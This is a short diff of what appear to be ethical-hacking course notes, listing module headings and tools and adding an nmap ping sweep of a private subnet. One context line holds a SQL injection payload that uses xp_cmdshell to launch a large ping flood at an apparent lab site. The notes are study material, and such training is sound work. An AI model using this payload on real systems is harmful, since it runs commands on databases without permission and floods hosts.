@@ -164,3 +164,8 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 Module 19 : Cloud Computing
 owncloud
 NetBIOS Enumerator
+
+
+
+
+**** [  sudo nmap -sn 192.168.4.0/24  ]  ****
